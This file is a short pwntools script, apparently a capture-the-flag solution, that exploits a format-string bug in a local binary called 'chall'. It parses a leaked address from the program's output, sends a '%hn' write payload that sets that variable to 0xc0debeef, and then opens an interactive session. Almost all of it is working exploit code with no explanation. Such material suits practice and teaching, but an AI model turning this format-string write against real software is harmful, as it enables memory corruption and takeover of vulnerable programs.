from pwn import *
from struct import pack
import time

context.terminal = ['kitty', '@', 'launch', '--keep-focus']

# io = gdb.debug('./chall', gdbscript='''
# # break main
# b *0x0000000000401704
# continue
# ''')

io = ELF('./chall').process()

io.recvuntil(b'@ ')
line = io.recvuntil(' ')
var_addr = line[:-1]
print('var_addr', var_addr)

# c0de - beef = 495
# so write beef first, then c0de
pwnmsg = b'%48879x%10$hn%495x%11$hn' + b'a'*8 + p64(int(var_addr, 16)+2, endian='little') + p64(int(var_addr, 16), endian='little')

print(pwnmsg)

io.recvuntil(b'input: ')
io.sendline(pwnmsg)
print(io.recvline())

io.interactive()
